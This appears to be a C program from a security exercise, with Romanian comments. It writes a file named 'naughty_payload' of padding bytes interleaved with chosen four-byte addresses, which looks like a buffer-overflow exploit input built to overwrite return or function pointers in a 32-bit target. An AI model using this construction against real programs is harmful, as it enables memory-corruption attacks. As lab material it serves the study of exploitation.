#include <stdio.h>

int main() {
	FILE *file = fopen("naughty_payload", "w");
	//sir 1
	for (int i = 0; i < 141; i++)
		fprintf(file, "%c", 97);
	//adresa 1
	fprintf(file, "%c%c%c%c",32,11,23,159);

	for (int i = 0; i < 29; i++)
		fprintf(file, "%c", 97);
	
	//sir 2
	for (int i = 0; i < 87; i++)
		fprintf(file, "%c", 97);
	//adresa 2
	fprintf(file, "%c%c%c%c",160,115,46,198);

	for (int i = 0; i < 36; i++)
		fprintf(file, "%c", 97);

	//sir 3
	for (int i = 0; i < 100; i++)
		fprintf(file, "%c", 97);
	//adresa 3
	fprintf(file, "%c%c%c%c",3,253,161,227);

	for (int i = 0; i < 212; i++)
		fprintf(file, "%c", 97);

	//sir 4
	for (int i = 0; i < 344; i++)
		fprintf(file, "%c", 97);
	//adresa 4
	fprintf(file, "%c%c%c%c",225,110,36,145);

	for (int i = 0; i < 115; i++)
		fprintf(file, "%c", 97);

	fprintf(file, "%c%c%c%c",177,133,4,8);

	fclose(file);


	return 0; 
}
